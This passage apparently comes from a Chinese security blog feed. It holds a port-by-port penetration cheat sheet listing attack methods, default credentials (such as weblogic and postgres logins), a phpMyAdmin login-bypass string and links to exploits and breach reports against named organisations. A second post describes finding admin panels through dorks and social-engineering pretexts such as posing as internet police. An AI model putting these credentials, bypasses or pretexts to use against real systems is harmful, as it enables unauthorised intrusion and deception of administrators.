<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0162704">大量惠普打印机远程telnet可被查看和操作</a></p>
<h3 id="Windows远程连接"><a href="#Windows远程连接" class="headerlink" title="Windows远程连接"></a>Windows远程连接</h3><p>远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p>
<p>默认端口：3389</p>
<p>攻击方式：</p>
<p>爆破：3389端口爆破工具就有点多了</p>
<p>Shift粘滞键后门：5次shift后门</p>
<p>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；<a href="http://blog.163.com/rz_xiaojia/blog/static/119209198201251195340629/">请参考</a></p>
<h3 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h3><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p>
<p>默认端口：5900+桌面ID（5901；5902）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>认证口令绕过：</p>
<p>拒绝服务攻击：（<a href="http://drops.wooyun.org/papers/9014">CVE-2015-5239</a>）</p>
<p>权限提升：（CVE-2013-6886）</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0143044">广西电信客服服务器使用VNC存在弱口令可直接控制</a></p>
<h3 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h3><p>PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p>
<p>默认端口：5632</p>
<p>攻击方式：</p>
<p>提权控制服务：</p>
<p>拒绝服务攻击：</p>
<p>代码执行：<a href="https://www.seebug.org/vuldb/ssvid-30050">请参考</a></p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-034519/">黑龙江物价局多处安全漏洞可能导致服务器沦陷(pcAnywhere提权+密码突破)</a></p>
<h2 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h2><p>HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p>
<p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p>
<h3 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务"></a>IIS服务</h3><p>默认端口：80/81/443</p>
<p>攻击方式：</p>
<p>IIS<br>PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</p>
<p>短文件名泄漏：这种一般没啥影响</p>
<p>解析漏洞：详细见apache服务</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-047134">徐州市教育系统大量IIS PUT漏洞</a></p>
<p><a href="http://www.wooyun.org/bug.php?action=view&id=27365">用友软件IIS写权限(PUT)导致可获取webshell控制服务器</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-093865">国家电网某分站存在iis短文件名漏洞</a></p>
<h3 id="Apache-Tomcat-Nginx-Axis2"><a href="#Apache-Tomcat-Nginx-Axis2" class="headerlink" title="Apache/Tomcat/Nginx/Axis2"></a>Apache/Tomcat/Nginx/Axis2</h3><p>默认端口：80/8080</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破manager后台）</p>
<p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</p>
<p>解析漏洞：<a href="http://drops.wooyun.org/papers/539">请参考</a></p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-018433">安卓开发平台存在上传漏洞和Apache解析漏洞,成功获取webshell</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-06947">腾讯分站 Apache 漏洞</a></p>
<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><p>默认端口：7001</p>
<p>攻击方式：</p>
<p>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</p>
<p>Congsole后台部署webshell：</p>
<p>Java反序列化：</p>
<p>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</p>
<p>SSRF窥探内网：<a href="http://www.wooyun.org/bugs/wooyun-2015-0136698">央视网SSRF可窥探内网</a></p>
<p>案列分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-038214">福建省人力资源和社会保障厅下属某WEBLOGIC弱口令</a></p>
<p><a href="http://drops.wooyun.org/tips/8321">利用Weblogic进行入侵的一些总结</a></p>
<h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><p>默认端口8080；其他端口1098/1099/4444/4445/8080/8009/8083/8093</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破jboss系统后台）</p>
<p>远程代码执行：<a href="http://www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html">由于配置不当造成</a></p>
<p>Java反序列化：</p>
<p>案例分享</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-07409">中华人民共和国民政部JBoss配置不当</a></p>
<p><a href="http://drops.wooyun.org/papers/178">JBOSS安全问题总结</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0110279">中国科学院某处jboss应用漏洞</a></p>
<h3 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h3><p>默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</p>
<p>攻击方式：</p>
<p>爆破：弱口令（控制台）</p>
<p>任意文件泄漏：（CVE-2014-0823）</p>
<p>Java反序列化</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-036803">中国电信某通用型业务系统(Websphere)GetShell漏洞</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0167244">大汉网络有限公司远程命令执行漏洞(WebSphere案例)</a></p>
<h3 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h3><p>默认端口：http 8080；IIOP 3700；控制台4848</p>
<p>攻击方式：</p>
<p>爆破：弱口令（对于控制台）</p>
<p>任意文件读取：</p>
<p>认证绕过：</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0144595/">应用服务器glassfish存在通用任意文件读取漏洞</a></p>
<p><a href="http://www.tuicool.com/articles/ZRJriy">Oracle GlassFish Server认证绕过</a></p>
<h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p>默认端口：8080、8089</p>
<p>攻击方式：</p>
<p>爆破：弱口令（默认管理员）</p>
<p>未授权访问：</p>
<p>反序列化：</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-062541">酷6Jenkins系统未授权访问可执行系统命令</a></p>
<h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><p>默认端口：8080</p>
<p>攻击方式：</p>
<p>目录遍历</p>
<p>远程文件读取</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-017200">爱奇艺Resin配置漏洞</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0126353">Resin漏洞利用案例之目录遍历/以金蝶某系统为例</a></p>
<h3 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h3><p>默认端口：8080</p>
<p>攻击方式：</p>
<p><a href="http://drops.wooyun.org/papers/4972">远程共享缓冲区溢出</a></p>
<h3 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h3><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p>
<p>默认端口：1352</p>
<p>攻击方式：</p>
<p>爆破：弱口令（admin password）控制台</p>
<p>信息泄露</p>
<p>跨站脚本攻击</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-053881">Lotus Domino WebMail一处越权访问</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134024">中电投集团某系统弱口令直达内网涉及/OA系统/内部邮箱/财务系统/人力资源系统</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0109008">中国某大型金融机构地方业务弱口令导致数万商户信息泄露&amp;访问Lotus Domino后台</a></p>
<h2 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h2><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p>
<h3 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h3><p>默认端口：3306</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>身份认证漏洞：<a href="http://www.freebuf.com/vuls/3815.html">CVE-2012-2122</a></p>
<p>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</p>
<p>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@”  密码任意</p>
<p>案例分享：</p>
<p><a href="https://www.seebug.org/appdir/MySQL">漏洞分享</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0115534/">和讯网某站点存在mysql注入漏洞</a></p>
<p><a href="http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390">MySQL提权总结</a></p>
<h3 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h3><p>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
<p>攻击方式：</p>
<p>爆破：弱口令/使用系统用户</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/1620">MSSQL注射总结</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102404">上海安脉综合管理系统mssql注射漏洞</a></p>
<p><a href="http://drops.wooyun.org/tips/1067">解密MSSQL连接数据库密码</a></p>
<p><a href="http://www.freebuf.com/articles/database/22997.html">从攻击MSSQL到提权</a>: 使用msf针对mssql的一次完整渗透</p>
<h3 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h3><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>注入攻击；</p>
<p>漏洞攻击；</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/papers/6035">Oracle盲注结合XXE漏洞远程获取数据</a></p>
<h3 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；<a href="http://lcx.cc/?i=1275">浅谈postgresql数据库攻击技术</a>  大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<p>默认端口：5432</p>
<p>攻击方式：</p>
<p>爆破：弱口令：postgres postgres</p>
<p>缓冲区溢出：CVE-2014-2669</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/6449">Hacking postgresql</a></p>
<p><a href="http://zone.wooyun.org/content/4971">关于postgresql的那些事</a></p>
<h3 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h3><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：<a href="http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/2470">请参考</a></p>
<p>默认端口：27017</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问；github有攻击代码；<a href="https://github.com/yangbh/Hammer/blob/master/plugins/System/mongodb_unauth_access.py">请点击</a></p>
<p>案例分享：</p>
<p><a href="http://bobao.360.cn/learning/detail/274.html">MongoDB phpMoAdmin远程代码执行</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-047153">搜狐MongoDB未授权访问</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-066883">新浪微米未授权访问</a></p>
<p><a href="http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/2470">解决MongoDB各种隐患问题</a></p>
<h3 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h3><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt">https://yunpan.cn/cYjzHxawFpyVt</a>  访问密码 e547</p>
<p>默认端口：6379</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问+配合ssh key提权；</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0152710/">中国铁建网redis+ssh-keygen免认证登录</a></p>
<h3 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h3><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>命令注入：</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-083132">广西自考信息系统Sybase数据库注入</a></p>
<p><a href="http://www.venustech.com.cn/NewsInfo/124/22061.Html">Sybase EAServer命令注入漏洞</a></p>
<h3 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h3><p>默认端口：5000</p>
<p>攻击方式：</p>
<p>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0113071">哈尔滨银行主站DB2注入</a></p>
<p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p>
<p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p>
<h2 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h2><h3 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
<p>默认端口：25（smtp）、465（smtps）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-025810">腾讯邮箱smtp注册时间限制绕过漏洞</a></p>
<p><a href="http://drops.wooyun.org/papers/534">邮件伪造详解</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2011-03388">qq邮箱伪造发件地址，容易被钓鱼利用</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-098813">众多厂商邮件系统配置不当可伪造邮件人</a></p>
<h3 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h3><p>默认端口：109（POP2）、110（POP3）、995（POP3S）</p>
<p>攻击方式：</p>
<p>爆破；弱口令</p>
<p>未授权访问；</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bug.php?action=view&id=147087">中国联通沃邮箱等部分Android客户端免密码登陆（可获取任意联通用户pop3密码）</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2011-094877">中航信邮箱密码泄漏及VPN账号和大量邮箱弱口令导致可内网漫游拿到域控</a></p>
<h3 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h3><p>默认端口：143（imap）、993（imaps）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>配置不当</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-022037">163邮箱二次验证饶过缺陷</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-045426">南方周末邮件服务器任意文件读取漏洞</a></p>
<h2 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h2><h3 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h3><p>默认端口：53</p>
<p>攻击方式：</p>
<p>区域传输漏洞</p>
<p>见2中的总结</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-061403">全球Top1000Websites中存在DNS区域传送漏洞的网站列表</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0132048">团购王某站DNS域传送漏洞</a></p>
<p><a href="http://drops.wooyun.org/tips/1354">DNS泛解析与内容投毒</a></p>
<h3 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h3><p>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</p>
<p>攻击方式：</p>
<p>DHCP劫持；</p>
<p>见2中总结</p>
<p>案例分享：</p>
<p><a href="http://www.freebuf.com/articles/network/74995.html">流氓DHCP服务器内网攻击测试</a></p>
<h3 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h3><p>默认端口：161</p>
<p>攻击方式:</p>
<p>爆破：弱口令</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/409">snmp弱口令引起的信息泄漏</a></p>
<p><a href="http://drops.wooyun.org/tips/2106">基于snmp的反射攻击的理论及其实现</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-081037">华为某服务器SNMP弱口令</a></p>
<h2 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h2><h3 id="Hadoop文件服务"><a href="#Hadoop文件服务" class="headerlink" title="Hadoop文件服务"></a>Hadoop文件服务</h3><p>默认端口：<a href="http://hsrong.iteye.com/blog/1374734">请参考</a></p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-020282">Apache Hadoop远程命令执行</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-022434">新浪漏洞系列第六弹–大量hadoop应用对外访问</a></p>
<h3 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h3><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p>
<p>默认端口：2181</p>
<p>攻击方式：</p>
<p>未授权访问；</p>
<p>案例分享：</p>
<p><a href="http://tangscan.com/plugin/17261">zookeeper未授权访问漏洞</a></p>
<p>网上关于这方面的案例暂时不多，但是对于大数据逐渐泛滥的今天，这些漏洞未来会在乌云上出现一大波！</p>
<h3 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h3><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
<p>默认端口：8069</p>
<p>攻击方式：</p>
<p>远程命令执行：</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/68">当渗透遇到zabbix–小谈zabbix安全</a></p>
<p><a href="http://www.secpulse.com/archives/2089.html">Zabbix的前台SQL注射漏洞利用</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-025219">网易zabbix运维不当，导致任意命令执行。(可提权、可内网渗透)</a></p>
<h3 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h3><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p>
<p>默认端口：9200（）、9300（）</p>
<p>攻击方式：</p>
<p>未授权访问；</p>
<p>远程命令执行；</p>
<p>文件遍历；</p>
<p>低版本webshell植入；</p>
<p>案例分享：</p>
<p><a href="http://www.secpulse.com/archives/5401.html">ElasticSearch 远程代码执行漏洞</a></p>
<p><a href="http://www.freebuf.com/tools/38025.html">elasticsearch 漏洞利用工具</a></p>
<h3 id="memcache服务"><a href="#memcache服务" class="headerlink" title="memcache服务"></a>memcache服务</h3><p>默认端口：11211</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/papers/865">Memcache安全配置</a></p>
<p><a href="https://help.aliyun.com/knowledge_detail/6936805.html">memcache 未授权访问漏洞</a></p>
<h3 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h3><p>R服务：TCP端口512,513和514为著名的rlogin提供服务。在系统中被错误配置从而允许远程访问者从任何地方访问（标准的，rhosts + +）。</p>
<p>默认端口：512（remote process execution）；513（remote login a la<br>telnet）；514（cmd）</p>
<p>攻击方式：</p>
<p>使用rlogin直接登录对方系统；</p>
<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI：我们使用这两个端口很少的原因是因为必须是java，而且rmi穿越防火墙并不好穿越；这里我不会去涉及其他的东西，这里提出RMI只是因为在前段时间的java反序列化中，我们的小伙伴Bird写过一个weblogic利用工具，里面涉及到了RMI的一些东西，在有的时候使用socket不能成功时，我们可以使用RMI方式来进行利用；</p>
<p>默认端口：1090（）、1099（）</p>
<p>攻击方式：</p>
<p>远程命令执行（java反序列化，调用rmi方式执行命令）</p>
<p>这就是RMI的魅力了！</p>
<p>工具下载：<a href="http://www.heysec.org/archives/242">请点我</a></p>
<h3 id="Rsync服务"><a href="#Rsync服务" class="headerlink" title="Rsync服务"></a>Rsync服务</h3><p>Rsync：类UNIX系统下的数据备份工具（remote sync），属于增量备份；关于它的功能，大家自行百度百科吧，其实上面很多大家也看到了说是端口渗透，其实就是端口对应服务的渗透，服务一般出错就在配置或者版本问题上，rsync也不例外。Rsync默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。</p>
<p>默认端口：873</p>
<p>攻击方式：</p>
<p>未授权访问；</p>
<p>本地提权：rsync默认以root运行，利用rsync上传一个文件，只要这个文件具有s权限，我们执行我们的攻击脚本就可以具有root权限。详细<a href="https://www.91ri.org/11093.html">请参考</a>和<a href="http://drops.wooyun.org/papers/161">参考二</a></p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-049993">搜狐几处rsync未授权访问</a></p>
<h3 id="Socket代理"><a href="#Socket代理" class="headerlink" title="Socket代理"></a>Socket代理</h3><p>默认端口：1080</p>
<p>Socket代理针对代理来说没有什么漏洞，一般只是在渗透过程中作为我们的代理，进入内网，或者渗透域和林的时候有帮助。这里不做过多描述，但是可以尝试爆破一下代理的用户名和密码，万一运气好能登录，不也<del>~</del></p>
<p>案例分享：</p>
<p><a href="https://www.91ri.org/10238.html">利用php socket5代理渗透内网</a></p>
]]></content>
  </entry>
  <entry>
    <title>查找网站后台地址</title>
    <url>/2020/02/20/%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80/</url>
    <content><![CDATA[<p>我们经常会遇到脱裤后，得到了管理员的账号和密码后，想继续下去的时候，就得有后台的地址才能更深入的渗透下去</p>
<p>  一 字典查找法</p>
<p>   大家要养成一个小小的习惯..把一些上传的地址..后台地址.表段记录下来..是有好处的，也可以去下些别人收集的字典..配合wwwscan 啊D 黑客动画巴明小子旁注之类的工具去扫描..不过成功机率不是很高(一般管理都是根据自己的习惯乱写的) 当然扫下总有好处的..说不定就会扫到后台或上传路径..</p>
<p>二 工具扫描法</p>
<p>   其实上面也用到了工具.. 介绍本人常用的几款工具:阿D注入工具的后台扫描功能,还有明小子的后台扫描功能wwwscan目录扫描器 御剑的目录扫描功能 等等。</p>
<p>三 搜索引擎查找法 </p>
<p>   其实今天要说的就是这个方法..语法site:<a href="http://www.myhack58.com/">www.myhack58.com</a> inurl:xx (关键字)这个是我常用的..当然这里我也只讲这一个..还有其它的..自己去看google hack 结合起来用..用实例讲可能会好点.. 目标: <a href="http://www.myhack58.com/">www.myhack58.com</a></p>
<p>Site:<a href="http://www.google.com/">www.google.com</a>   inurl:asp 这就是列出所有收录的asp页面…站大的话找死人..从这我们可以延伸出去一点..到有些网站里可以查到网站被百度 google 等 收录的所有页面 …这里不提了..但是大家看下.站大的话我们翻都要翻死后台相关信息的查找</p>
<p>由于谷歌被大陆屏蔽,大家可以使用谷歌翻墙，百度也支持这些语法搜索。</p>
<p>site:<a href="http://www.google.com/">www.google.com</a> intext:管理  无利用</p>
<p>site:<a href="http://www.google.com/">www.google.com</a> inurl:login(登陆的页面)</p>
<p>site:<a href="http://www.google.com/">www.google.com</a> intitle:后台 (很容易的就找到了网站的后台登陆口)</p>
<p>site:google.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|manage|admin|login|system</p>
<p>site:google.com inurl:login|admin|manage|manager|admin_login|login_admin|system</p>
<p>site:google.com intitle:管理|后台|登陆|</p>
<p>site:google.com intext:验证码</p>
<hr>
<p>【查找网站后台的方法】</p>
<p>1.猜解常用路径</p>
<p>常用后台路径:</p>
<p>Admin</p>
<p>Adminlogin</p>
<p>Admin/admin_login.asp</p>
<p>Admin/admin_login.php</p>
<p>Manage</p>
<p>User</p>
<p>System</p>
<p>大部分网站默认都是admin目录后台。</p>
<p>2.Robots.txt</p>
<p>Robots是防止搜索引擎抓取敏感目录和文件的的一个指引文件。</p>
<p>Admin/</p>
<p>很多管理员为了防止后台被搜索引擎抓取，所有会把后台路径放进robots.txt里</p>
<p>类似robots.txt sitemap.xml</p>
<p>3.扫描工具</p>
<p>如果字典内有目标的后台路径，那么就可以扫出来(可能会有复杂的情况，禁止扫描等 不过很少)</p>
<p>4.爬行(Awvs  burp suite 整站爬行工具)</p>
<p>扫描:暴力猜解  利用字典</p>
<p>爬行:</p>
<p>访问网站首页：</p>
<p>A界面存在很多链接</p>
<p>​    抓取A界面的所有链接，分别变成B C D 等等</p>
<p>​            继续抓取B C D界面，一直循环。直到爬行完。</p>
<p>5.查看图片属性</p>
<p>为什么会爆出后台路径？</p>
<p>当我们上传点在后台目录后面，很有可能导致这种情况。</p>
<p>一般编辑器放在后台目录后面，基本上都可以用这种方法找到后台。</p>
<p>\1. 自带上传点</p>
<p>\2. 编辑器上传点   上传会导致这种情况。</p>
<p>6.谷歌语法 site:目标站 intitle:后台 管理 登录 管理员 管理中心  inurl:admin|login|user</p>
<p>site:zlgc.usx.edu.cn</p>
<p>7.网站位置暴露管理入口</p>
<p>背景:</p>
<p>尤其是多个管理员的网站，一般学校和行政单位居多。为了方便登录后台，会在前台留一个入口。</p>
<hr>
<p>1、工具辅助查找</p>
<p>如大家常用的:明小子、啊D、wwwscan</p>
<p>以及一些列目录工具:Acunetix Web Vulnerability Scanner 、JSky、IntelliTamper、Netsparker…等等</p>
<p>现在很多管理员都学着把后台登陆页面放其他位置，二B的很！</p>
<p>清凉网站后台扫描器 V3.0内置的后台数据库也非常的全。</p>
<p>2、网站资源利用</p>
<p>如:网站根目录Robots.txt文本、图片路径爆后台、查看网站底部版权信息是否有连接、通过网站里的文件名查询源码下载得知</p>
<p>3、搜索引擎查询</p>
<p>命令很多种列几种自己常用的吧:</p>
<p>site:sfz.1ri.me intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|manage|admin|login|system</p>
<p>site:sfz.1ri.me inurl:login|admin|manage|manager|admin_login|login_admin|system</p>
<p>site:sfz.1ri.me intitle:管理|后台|登陆|</p>
<p>site:sfz.1ri.me intext:验证码</p>
<p>4、社会工程学</p>
<p>猜吧…</p>
<p>如:前段时间的CCTV <a href="http://chinvan.cctv.com/ChinvanAdmin/login.aspx">http://chinvan.cctv.com/ChinvanAdmin/login.aspx</a> 看出什么没有这样的情况经常能碰到就是域名+admin</p>
<p><a href="http://www.sfz.1ri.me/">www.sfz.1ri.me</a></p>
<p>hackseoadmin hackseo_admin hackseomanage adminhackseo等等</p>
<p>或者注入的时候还可以根据数据库里的一些敏感名字猜管理地址，例如lz说的hackseo_admin。</p>
<p>这个要看运气了,祝大家好运~</p>
<p>————————————————————————————————————————————</p>
<p>直接问管理员：你们后台地址是多少，我试试能进去不？朋友告诉我你们网站的密码是admin admin</p>
<p>猥琐的：注册个会员发表个反动文章，然后加管理qq，然后你就说我是网监，把这条新闻删了。给我加个管理员，方便我以后自己删……（我以前做站就遇到过），此方法t00ls首发，如有人利用此方法违法，本人不承担责任。</p>
<p>————————————————————————————————————————————</p>
<p>加管理员QQ，说要买他网站程序的源码，价钱出高点，让管理动心，然后让他给个后台和用户密码进后台看功能。。如果他不同意就让他QQ远程，这他应该会同意的。。。然后你就得到后台地址了。。。嘻嘻，金钱诱惑。。。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>python-web-安全总结</title>
    <url>/2020/09/20/python-web-%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><strong>xss</strong></p>
<p>python下的xss其原理跟php是一样的，django近年的例子如下：</p>
<p><strong>CVE-2017-12794</strong>,此例中通过抛出异常造成xss。</p>
<p><strong>sql注入</strong></p>
